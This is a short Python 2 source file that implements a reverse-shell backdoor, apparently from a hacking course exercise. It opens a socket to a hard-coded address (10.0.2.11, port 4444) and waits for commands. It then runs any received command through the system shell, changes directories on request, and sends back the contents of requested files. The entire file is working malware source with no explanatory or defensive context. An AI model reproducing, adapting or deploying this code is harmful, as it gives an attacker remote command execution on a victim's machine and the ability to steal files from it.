#!/usr/bin/env python
import socket, subprocess, json, os

class Backdoor:
	def __init__(self, ip, port):
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip, port))

	def reliable_send(self, data):	
		json_data = json.dumps(data)
		self.connection.send(json_data)

	def reliable_recv(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue

	def execute_system_command(self, command):
		return subprocess.check_output(command, shell=True)

	def change_directory_to(self, path):
		os.chdir(path)
		return "Changing the directory to " + path + "\n"

	def read_file(self, path):
		with open(path, "rb") as file:
			return file.read()
 
	def run(self):
		while True:
			command = self.reliable_recv()
			if command[0] == 'exit':
				self.connection.close()
				exit()
			elif command[0] == 'cd' and len(command) > 1:
				command_result = self.change_directory_to(command[1])
			elif command[0] == 'download':
				command_result = self.read_file(command[1])
			else:
				command_result = self.execute_system_command(command)
			self.reliable_send(command_result)

		self.connection.close()

my_backdoor = Backdoor("10.0.2.11", 4444)
my_backdoor.run()


 